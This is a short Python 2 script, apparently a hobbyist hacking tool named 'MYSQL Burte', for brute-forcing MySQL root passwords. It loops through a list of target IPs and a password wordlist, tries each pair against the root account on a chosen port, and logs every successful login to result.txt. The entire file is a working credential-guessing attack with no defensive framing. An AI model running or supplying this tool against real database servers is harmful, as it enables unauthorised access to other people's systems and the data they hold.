
# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import threading
import Queue
import MySQLdb
import time
print '''
-------------------------------------
    Langziyanqing MYSQL Burte
-------------------------------------
'''
#time.sleep(5)
set_port1 = input("[+]Set Burte Port:")
set_port = int(set_port1)
def Crack(password,ip,set_port):
        print '[*]IP:' + ip + ' Name:root' + ' password:'+ password + ' Port:' + str(set_port)
        try:
            conn = MySQLdb.connect(host=ip, user='root', passwd=password, db='test', port=set_port, connect_timeout=4)
            msg = "[+]:%s Username: root Password is: %s" % (ip, password)
            print msg
            output = open('result.txt', 'a')
            output.write(str(ip) + ":" + str(set_port ) + '  root' + ' ' + str(password) + "\n")
            pass
        except Exception,e:
            #print e
            print '[-]password error...'
            pass
def start():
    with open('ips.txt','r') as f:
        for i1 in f:
            ip = i1.replace('\n','')
            with open("password.txt",'r')as d2:
                for d1 in d2:
                    password = d1.replace('\n','')
                    #print ip + password
                    Crack(password, ip, set_port)

t1 = threading.Thread(target=start)
t1.start()